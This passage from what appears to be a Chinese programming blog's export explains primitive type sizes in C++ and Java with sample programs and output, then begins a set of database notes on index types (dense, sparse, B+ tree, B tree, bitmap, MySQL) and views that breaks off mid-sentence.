<code>pointer(指针)</code></p>\n<table>\n<thead>\n<tr>\n<th>数据类型</th>\n<th>32位系统字节数</th>\n<th>32系统二进制位数</th>\n<th>64位系统字节数</th>\n<th>64位系统二进制位数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bool</td>\n<td>1</td>\n<td>8</td>\n<td>1</td>\n<td>8</td>\n</tr>\n<tr>\n<td>char</td>\n<td>1</td>\n<td>8</td>\n<td>1</td>\n<td>8</td>\n</tr>\n<tr>\n<td>short</td>\n<td>2</td>\n<td>16</td>\n<td>2</td>\n<td>16</td>\n</tr>\n<tr>\n<td>int</td>\n<td>4</td>\n<td>32</td>\n<td>4</td>\n<td>32</td>\n</tr>\n<tr>\n<td>long</td>\n<td>4</td>\n<td>32</td>\n<td>8</td>\n<td>64</td>\n</tr>\n<tr>\n<td>long long</td>\n<td>8</td>\n<td>64</td>\n<td>8</td>\n<td>64</td>\n</tr>\n<tr>\n<td>float</td>\n<td>4</td>\n<td>32</td>\n<td>4</td>\n<td>32</td>\n</tr>\n<tr>\n<td>double</td>\n<td>8</td>\n<td>64</td>\n<td>8</td>\n<td>64</td>\n</tr>\n<tr>\n<td>pointer</td>\n<td>4</td>\n<td>32</td>\n<td>8</td>\n<td>64</td>\n</tr>\n</tbody>\n</table>\n<p>可以看出其中只有<code>long</code> <code>pointer</code>是不同的，32位平台32位，64位平台64位，其实<code>pointer</code>就是用<code>long</code>表示的<br><a id=\"more\"></a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"bool      sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">bool</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"char      sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"short     sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">short</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"int       sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"long      sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">long</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"long long sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"float     sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">float</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"double    sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">double</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"pointer   sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">void</span> *) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>64位linux输出结果<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">bool</span>      <span class=\"keyword\">sizeof</span> : <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">char</span>      <span class=\"keyword\">sizeof</span> : <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">short</span>     <span class=\"keyword\">sizeof</span> : <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">int</span>       <span class=\"keyword\">sizeof</span> : <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"keyword\">long</span>      <span class=\"keyword\">sizeof</span> : <span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"keyword\">long</span> <span class=\"keyword\">long</span> <span class=\"keyword\">sizeof</span> : <span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"keyword\">float</span>     <span class=\"keyword\">sizeof</span> : <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"keyword\">double</span>    <span class=\"keyword\">sizeof</span> : <span class=\"number\">8</span></span><br><span class=\"line\">pointer   <span class=\"keyword\">sizeof</span> : <span class=\"number\">8</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h2><p>Java的基本类型有<code>boolean</code> <code>char</code> <code>short</code> <code>float</code> <code>double</code> <code>int</code> <code>long</code> <code>byte</code>, Java中的基本类型大小是固定的，与操作平台位数无关</p>\n<table>\n<thead>\n<tr>\n<th>数据类型</th>\n<th>字节数</th>\n<th>二进制位数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>boolen</td>\n<td>1</td>\n<td>8</td>\n</tr>\n<tr>\n<td>byte</td>\n<td>1</td>\n<td>8</td>\n</tr>\n<tr>\n<td>char</td>\n<td>2</td>\n<td>16</td>\n</tr>\n<tr>\n<td>short</td>\n<td>2</td>\n<td>16</td>\n</tr>\n<tr>\n<td>int</td>\n<td>4</td>\n<td>32</td>\n</tr>\n<tr>\n<td>long</td>\n<td>8</td>\n<td>64</td>\n</tr>\n<tr>\n<td>float</td>\n<td>4</td>\n<td>32</td>\n</tr>\n<tr>\n<td>double</td>\n<td>8</td>\n<td>64</td>\n</tr>\n</tbody>\n</table>\n<p>值得注意的是Java中的<code>char</code>类型占两个字节，而C++中只占一个字节。<code>char</code>在Java中是16位的，因为Java用的是<code>Unicode</code>。不过8位的ASCII码包含在<code>Unicode</code>中，是从0~127的。至于为什么，这里留下一点故事 ：</p>\n<p>Java中使用Unicode的原因是，Java的Applet允许全世界范围内运行，那它就需要一种可以表述人类所有语言的字符编码。Unicode。但是English，Spanish，German, French根本不需要这么表示，所以它们其实采用ASCII码会更高效。这中间就存在一个权衡问题。<br>那么是不是该好奇中文字应该占多少字节，这个不同的编码不一样，通常在2-4个字节：</p>\n<ul>\n<li><code>GBK</code>编码，一个汉字占两个字节</li>\n<li><code>UTF-16</code>编码，通常汉字占两个字节</li>\n<li><code>CJKV</code>扩展B区、扩展C区、扩展D区中的汉字占四个字节（一般字符的Unicode范围是U+0000至U+FFFF，而这些扩展部分的范围大于U+20000，因而要用两个UTF-16）</li>\n<li><code>UTF-8</code>编码是变长编码，通常汉字占三个字节，扩展B区以后的汉字占四个字节</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TypeSize</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"byte      sizeof : \"</span> + Byte.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"char      sizeof : \"</span> + Character.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"short     sizeof : \"</span> + Short.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"int       sizeof : \"</span> + Integer.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"long      sizeof : \"</span> + Long.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"float     sizeof : \"</span> + Float.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"double    sizeof : \"</span> + Double.SIZE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出结果<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">byte</span>      sizeof : <span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"keyword\">char</span>      sizeof : <span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"keyword\">short</span>     sizeof : <span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"keyword\">int</span>       sizeof : <span class=\"number\">32</span></span><br><span class=\"line\"><span class=\"keyword\">long</span>      sizeof : <span class=\"number\">64</span></span><br><span class=\"line\"><span class=\"keyword\">float</span>     sizeof : <span class=\"number\">32</span></span><br><span class=\"line\"><span class=\"keyword\">double</span>    sizeof : <span class=\"number\">64</span></span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>鉴于之前多次面试题考察基本类型大小问题，今天来做个记录。</p>\n<h2 id=\"C\"><a href=\"#C\" class=\"headerlink\" title=\"C++\"></a>C++</h2><p>C++的基本类型有<code>bool</code> <code>char</code> <code>short</code> <code>float</code> <code>double</code> <code>int</code> <code>long</code> <code>long long</code> <code>pointer(指针)</code></p>\n<table>\n<thead>\n<tr>\n<th>数据类型</th>\n<th>32位系统字节数</th>\n<th>32系统二进制位数</th>\n<th>64位系统字节数</th>\n<th>64位系统二进制位数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bool</td>\n<td>1</td>\n<td>8</td>\n<td>1</td>\n<td>8</td>\n</tr>\n<tr>\n<td>char</td>\n<td>1</td>\n<td>8</td>\n<td>1</td>\n<td>8</td>\n</tr>\n<tr>\n<td>short</td>\n<td>2</td>\n<td>16</td>\n<td>2</td>\n<td>16</td>\n</tr>\n<tr>\n<td>int</td>\n<td>4</td>\n<td>32</td>\n<td>4</td>\n<td>32</td>\n</tr>\n<tr>\n<td>long</td>\n<td>4</td>\n<td>32</td>\n<td>8</td>\n<td>64</td>\n</tr>\n<tr>\n<td>long long</td>\n<td>8</td>\n<td>64</td>\n<td>8</td>\n<td>64</td>\n</tr>\n<tr>\n<td>float</td>\n<td>4</td>\n<td>32</td>\n<td>4</td>\n<td>32</td>\n</tr>\n<tr>\n<td>double</td>\n<td>8</td>\n<td>64</td>\n<td>8</td>\n<td>64</td>\n</tr>\n<tr>\n<td>pointer</td>\n<td>4</td>\n<td>32</td>\n<td>8</td>\n<td>64</td>\n</tr>\n</tbody>\n</table>\n<p>可以看出其中只有<code>long</code> <code>pointer</code>是不同的，32位平台32位，64位平台64位，其实<code>pointer</code>就是用<code>long</code>表示的<br>","more":"<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"bool      sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">bool</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"char      sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"short     sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">short</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"int       sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"long      sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">long</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"long long sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"float     sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">float</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"double    sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">double</span>) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"pointer   sizeof : \"</span> &lt;&lt; <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">void</span> *) &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>64位linux输出结果<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">bool</span>      <span class=\"keyword\">sizeof</span> : <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">char</span>      <span class=\"keyword\">sizeof</span> : <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">short</span>     <span class=\"keyword\">sizeof</span> : <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">int</span>       <span class=\"keyword\">sizeof</span> : <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"keyword\">long</span>      <span class=\"keyword\">sizeof</span> : <span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"keyword\">long</span> <span class=\"keyword\">long</span> <span class=\"keyword\">sizeof</span> : <span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"keyword\">float</span>     <span class=\"keyword\">sizeof</span> : <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"keyword\">double</span>    <span class=\"keyword\">sizeof</span> : <span class=\"number\">8</span></span><br><span class=\"line\">pointer   <span class=\"keyword\">sizeof</span> : <span class=\"number\">8</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h2><p>Java的基本类型有<code>boolean</code> <code>char</code> <code>short</code> <code>float</code> <code>double</code> <code>int</code> <code>long</code> <code>byte</code>, Java中的基本类型大小是固定的，与操作平台位数无关</p>\n<table>\n<thead>\n<tr>\n<th>数据类型</th>\n<th>字节数</th>\n<th>二进制位数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>boolen</td>\n<td>1</td>\n<td>8</td>\n</tr>\n<tr>\n<td>byte</td>\n<td>1</td>\n<td>8</td>\n</tr>\n<tr>\n<td>char</td>\n<td>2</td>\n<td>16</td>\n</tr>\n<tr>\n<td>short</td>\n<td>2</td>\n<td>16</td>\n</tr>\n<tr>\n<td>int</td>\n<td>4</td>\n<td>32</td>\n</tr>\n<tr>\n<td>long</td>\n<td>8</td>\n<td>64</td>\n</tr>\n<tr>\n<td>float</td>\n<td>4</td>\n<td>32</td>\n</tr>\n<tr>\n<td>double</td>\n<td>8</td>\n<td>64</td>\n</tr>\n</tbody>\n</table>\n<p>值得注意的是Java中的<code>char</code>类型占两个字节，而C++中只占一个字节。<code>char</code>在Java中是16位的，因为Java用的是<code>Unicode</code>。不过8位的ASCII码包含在<code>Unicode</code>中，是从0~127的。至于为什么，这里留下一点故事 ：</p>\n<p>Java中使用Unicode的原因是，Java的Applet允许全世界范围内运行，那它就需要一种可以表述人类所有语言的字符编码。Unicode。但是English，Spanish，German, French根本不需要这么表示，所以它们其实采用ASCII码会更高效。这中间就存在一个权衡问题。<br>那么是不是该好奇中文字应该占多少字节，这个不同的编码不一样，通常在2-4个字节：</p>\n<ul>\n<li><code>GBK</code>编码，一个汉字占两个字节</li>\n<li><code>UTF-16</code>编码，通常汉字占两个字节</li>\n<li><code>CJKV</code>扩展B区、扩展C区、扩展D区中的汉字占四个字节（一般字符的Unicode范围是U+0000至U+FFFF，而这些扩展部分的范围大于U+20000，因而要用两个UTF-16）</li>\n<li><code>UTF-8</code>编码是变长编码，通常汉字占三个字节，扩展B区以后的汉字占四个字节</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TypeSize</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"byte      sizeof : \"</span> + Byte.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"char      sizeof : \"</span> + Character.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"short     sizeof : \"</span> + Short.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"int       sizeof : \"</span> + Integer.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"long      sizeof : \"</span> + Long.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"float     sizeof : \"</span> + Float.SIZE);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"double    sizeof : \"</span> + Double.SIZE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出结果<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">byte</span>      sizeof : <span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"keyword\">char</span>      sizeof : <span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"keyword\">short</span>     sizeof : <span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"keyword\">int</span>       sizeof : <span class=\"number\">32</span></span><br><span class=\"line\"><span class=\"keyword\">long</span>      sizeof : <span class=\"number\">64</span></span><br><span class=\"line\"><span class=\"keyword\">float</span>     sizeof : <span class=\"number\">32</span></span><br><span class=\"line\"><span class=\"keyword\">double</span>    sizeof : <span class=\"number\">64</span></span><br></pre></td></tr></table></figure></p>"},{"title":"数据库大杂烩","date":"2018-04-13T07:18:23.000Z","_content":"\n## 索引\n### 顺序索引\n`聚集索引`：　如果包含记录的文件按照某个搜索码指定的顺序排序，那么该搜索码对应的索引称为聚集索引。\n`非聚集索引`：　搜索码指定的顺序与文件中记录的物理顺序不同的索引称为非聚集索引。\n\n诸如在大学教师记录文件中，用教师ID作为搜索码，记录按照该搜索码顺序存放。\n\n`稠密索引(dense index)` : **在稠密索引中，文件中的每一个搜索码值都有一个索引项**。在稠密聚集索引中，索引项包括搜索码值以及指向具有该搜索码的第一条数据记录的指针。具有相同搜索码值的其余记录顺序地存储在第一条数据记录之后，由于该索引是聚集索引，因此记录根据相同的搜索码值排序。而在稠密非聚集索引中，索引必须存储指向所有具有相同搜索码值的记录项的指针列表。\n> 稠密聚集索引具有相同搜索码值的记录按照指定顺序存储；但是稠密非聚集索引必须存储指向一个指针列表，这个列表里面有具有相同搜索码值的记录指针。聚集索引只存储第一条记录的指针，其他的按照顺序查找，非聚集索引就要记录一个指针表。\n\n![Dense index](http://www.assignmenthelp.net/assignment_help/images/dense-index-architecture.gif)\n\n<!--more-->\n\n`稀疏索引(sparse index)`： **在稀疏索引中，只为搜索码的某些值建立索引索引项**。只有当记录按照搜索码排列顺序存储时才能使用稀疏索引，也就是说，只有索引是聚集索引时才能使用稀疏索引。和稠密索引一样，每个索引项也包括一个搜索码值和指向该搜索码值的第一条记录的指针。为了定位一条记录，我们获取查询记录的搜索码值，再比较索引项中等于或者小于其搜索码值的最大项，然后从该索引项指向的记录开始，沿着文件中的指针查找，直到找到所需记录为止。\n\n![Sparse index](http://www.assignmenthelp.net/assignment_help/images/sparse-index-architecture.gif)\n\n> 就像图中，索引项中没有为每个搜索码(即右边表格中第二列)设立索引项，但这需要保证这些记录按照搜索码顺序排列才行。\n\n`多级索引`：在外层构建稀疏索引，通过二分查找找到外层索引，外层索引指向内层索引表，内层索引表再找到指定的索引项，最后去定位到记录。\n![Two-level index](http://www.cs.montana.edu/~halla/csci440/n18/figure-18-6.png)\n\n`辅助索引`：　按聚集索引顺序对文件进行顺序扫描是非常有效的，因为文件中记录的物理存储顺序和索引顺序一致。但是当我们新建立一个索引，而这个索引的顺序跟记录的物理存储顺序不一致时，我们就需要一个辅助索引，这个辅助索引指向每一条记录，这个辅助索引的顺序跟我们要新建的索引顺序一致。\n\n![Secondary index](https://raw.githubusercontent.com/alexeygrigorev/wiki-figures/master/ulb/dbsa/ind/secondary-dense-sparse.png)\n\n> 从图里面可以看到，我们新建的索引跟blocks的物理存储顺序不一致，为了解决这个问题，中间添加一个辅助索引，这个辅助索引是稠密索引，同时也根据我们新建索引的顺序进行排序。\n\n### B+树索引\n![B+ tree](https://turing.cs.hbg.psu.edu/courses/comp419.taw.s97/btree.gif)\n索引顺序文件组织的最大缺点在于，随着文件的增大，索引查找性能和数据顺序扫面性能都会下降。虽然这种性能下降可以通过对文件进行重新组织来弥补，但是我们不希望频繁地进行重组。\n\nB+树(B+ -tress)索引结构是在数据插入和删除的情况下仍能保持其执行效率的几种使用最广泛的索引结构之一。B+树索引采用平衡树结构，其中树根到树叶的每条路径的长度相同。树中每个非叶子节点有n/2~n个子女，其中n对特定的树是固定的。\nB+树索引是一种多级索引，但是其结构不同与多级索引顺序文件。典型的B+树结点结构如下 :\n\n![Internal node](http://4.bp.blogspot.com/-LQ2cFeN3_HI/Uy8TXyI0eOI/AAAAAAAACP0/bGH5v8JAPjU/s1600/Structure+of+an+internal+node+of+B++tree.jpg)\n\n> 这是内部结点结构\n\n![leaf node](http://2.bp.blogspot.com/--7OpPitZhoQ/Uy8TVPCxenI/AAAAAAAACPs/lUkMHUTlM2g/s1600/Structure+of+a+leaf+node+of+B++tree.jpg)\n\n> 这是叶子结点结构，其中key都表示搜索码值，而叶子节点的指针是指向记录块(或者是记录行)，而内部结点是指向下一层的结点。\n> 注意到叶子结点只使用了n-1个指针来指向记录，最后一个指针指向自己的兄弟结点，即下一个叶子节点，这样是为了将所有的叶子节点串起来，这样可以发现从最左边的节点开始，可以按照搜索码顺序遍历所有记录行，这为按顺序查找所有记录的SQL语句提供了更加高效的方式。\n\n### B树索引\n![B tree](http://www.assignmenthelp.net/assignment_help/images/implementation-B_plus_tree.gif)\nB树索引和B+树索引相似。**两种方法的主要区别在于B树去除了搜索码值存储中冗余**。在上面展示的B+树索引中可以看到搜索码3在结点中出现了两次，每个搜索码值都出现在某些叶子结点中，有的还在非叶子结点中重复出现。\n\n在B+树中，搜索码值可能同时出现在非叶子结点和叶子结点中。与B+树不同，B树只允许搜索码值出现一次(如果它们是唯一的)。由于B树中搜索码不重复，因此可以用比相应B+树索引更少的树结点来存储索引。然而在B树中，由于出现在非叶子中的搜索码值不会出现在其他地方，因此我们将不得不在非叶子节点中为每个搜索码增加一个指针域。附加的这些指针指向文件记录或相应搜索码所对应的桶中。\n\nB树叶子结点跟B+树叶子结点一样，不同在于非叶子结点 :\n![](http://www.assignmenthelp.net/assignment_help/images/B-tree-index-files-assignment-help.gif)\n\n### 散列索引\n借鉴`Java HashMap`的具体实现细节，通过仔细了解`HashMap`可以更加深入了解散列索引。在此推荐一篇讲述`HashMap`比较好的文章  [Java HashMap工作原理及实现](https://yikun.github.io/2015/04/01/Java-HashMap%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/)\n\n### 位图索引\n![Bitmap index](https://mjromeo.files.wordpress.com/2017/01/bitmap_index_example.png?w=646)\n\n简单解释一下，在图中可以发现`gender`记录项只有m、f两个值，那么系统为这两个值分别建立一个位图，对于m位图来说，记录有多少，位图就有多少位，只有当第i个记录`gender`为m时，m位图的第i位为1,其他不是m的记录位全为零。概括的说，位图就是表示某一搜索码值出现在了哪些位置，通过遍历搜索码值的位图来查找，诸如下列SQL语句\n``` SQL\nSELECT * FROM r WHERE gender = 'f'\n```\n这样的查询语句通过遍历f的位图是非常高效的。但是位图只是适用于搜索码值频繁出现，且选项少，这里所说的选项少是指比如记录人的性别只有三个选项:`男`、`女`、`不知道`，这样使用位图再适合不过了。通常情况下，位图可以和一般的B+树索引组合起来使用。\n\n### MySQL数据库几个基本的索引类型\n- **普通索引** : 这是最基本的MySQL数据库索引，它没有任何限制。\n- **唯一索引** : 它与前面的普通索引类似，不同的就是：MySQL数据库索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。\n- **主键索引** : 它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引。\n- **组合索引** : 多字段建立索引。\n\n## 视图\n视图这么一个概念我一直不太准确理解，各种参考书上说得太正式，导致我越来越蒙。来我们看一看视图的定义：\n\n**Any relation that is not part of the logical model, but is made visiable to an user as a virtual relation, is called a `view`**\n翻译过来就是**任何不是逻辑模型的一部分，但作为虚关系对用户可见的关系成为视图**\n\n在`Database System Concepts`这本书里面，作者通过一个例子来引出概念，这个例子如下：\n> 